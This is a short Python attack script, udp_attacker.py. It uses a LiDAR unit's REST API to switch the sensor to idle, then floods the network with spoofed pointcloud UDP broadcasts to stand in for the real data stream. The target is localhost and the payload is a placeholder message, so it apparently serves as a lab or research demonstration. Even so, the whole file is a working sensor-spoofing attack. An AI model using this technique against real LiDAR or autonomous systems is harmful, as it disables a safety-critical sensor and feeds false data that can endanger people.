"""
This script switches off the LiDAR and generates spoofed poincloud packets

Example usage:

.. code-block:: python

    udp_attacker.py
"""
import argparse
import requests
import socket
import time
import threading


def main():
    """
    Main function

    """
    parser = argparse.ArgumentParser(description='Switches off the LiDAR and generates spoofed poincloud packets')
    options = parser.parse_args()

    udp_port = 5044
    ip_address = 'localhost'

    # Check the current status of the LiDAR (should be 'running')
    try:
        response = requests.get('https://%s:8007/mode/get' % ip_address)
        print (response.text)
    except:
        print("Can't access LiDAR REST API")

    # Put the real LiDAR in idle mode which stops it from transmitting pointcloud packets
    try:
        response = requests.get('https://%s:8007/mode/set/idle' % ip_address)
        print (response.text)
    except:
        print("Can't access LiDAR REST API")

    # Setup the UDP socket for broadcasting spoofed pointcloud packets
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    udp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    print("Broadcasting on: %d" % udp_port)

    count = 0

    while True:
        udp_socket.sendto(b'Spoofed LiDAR Pointcloud packet: Message number %d' % count, ('<broadcast>', udp_port))
        count += 1
        time.sleep(0.150)


if __name__ == '__main__':
    main()
